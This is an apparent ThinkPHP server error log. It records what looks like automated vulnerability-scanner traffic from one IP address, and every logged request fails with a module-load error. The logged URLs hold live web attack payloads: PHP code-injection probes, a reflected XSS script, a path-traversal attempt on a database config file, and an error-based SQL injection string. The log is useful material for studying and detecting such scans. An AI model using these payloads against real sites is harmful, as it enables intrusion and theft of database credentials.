[ 2015-12-31T11:38:42+08:00 ] 121.42.0.14 /index.php?s=a_long_name_file_not_exist
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001111s ]
INFO: [ app_init ] --END-- [ RunTime:0.001468s ]
ERR: 无法加载模块:A_long_name_file_not_exist

[ 2015-12-31T11:41:53+08:00 ] 121.42.0.14 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001172s ]
INFO: [ app_init ] --END-- [ RunTime:0.001526s ]
ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}

[ 2015-12-31T11:41:54+08:00 ] 121.42.0.14 /index.php?s=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001232s ]
INFO: [ app_init ] --END-- [ RunTime:0.001639s ]
ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\

[ 2015-12-31T11:41:57+08:00 ] 121.42.0.14 /index.php?s=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001990s ]
INFO: [ app_init ] --END-- [ RunTime:0.002406s ]
ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();

[ 2015-12-31T11:42:19+08:00 ] 121.42.0.14 /index.php?s='%22%3E%3CscRipt%3Ealert(98733)%3C/sCript%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001346s ]
INFO: [ app_init ] --END-- [ RunTime:0.001719s ]
ERR: 无法加载模块:'">alert(98733)

[ 2015-12-31T11:51:03+08:00 ] 121.42.0.14 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001678s ]
INFO: [ app_init ] --END-- [ RunTime:0.002271s ]
ERR: 无法加载模块:Search

[ 2015-12-31T12:09:22+08:00 ] 121.42.0.14 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001223s ]
INFO: [ app_init ] --END-- [ RunTime:0.001647s ]
ERR: 无法加载模块:Goods

[ 2015-12-31T12:27:14+08:00 ] 121.42.0.14 /index.php?m=tg/admin&s=delivery_address
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001314s ]
INFO: [ app_init ] --END-- [ RunTime:0.001738s ]
ERR: 无法加载模块:Delivery_address

[ 2015-12-31T12:27:15+08:00 ] 121.42.0.14 /index.php?m=download/admin&s=order_update
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001354s ]
INFO: [ app_init ] --END-- [ RunTime:0.001767s ]
ERR: 无法加载模块:Order_update

[ 2015-12-31T12:27:16+08:00 ] 121.42.0.14 /index.php?m=buy/admin&s=add_cat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001129s ]
INFO: [ app_init ] --END-- [ RunTime:0.001487s ]
ERR: 无法加载模块:Add_cat

[ 2015-12-31T12:28:04+08:00 ] 121.42.0.14 /index.php?m=vote&c=index&a=post&subjectid=2
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001187s ]
INFO: [ app_init ] --END-- [ RunTime:0.001536s ]
ERR: 无法加载模块:Vote

[ 2015-12-31T12:28:05+08:00 ] 121.42.0.14 /index.php?m=vote&c=index&a=result&subjectid=2&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001243s ]
INFO: [ app_init ] --END-- [ RunTime:0.001768s ]
ERR: 无法加载模块:Vote

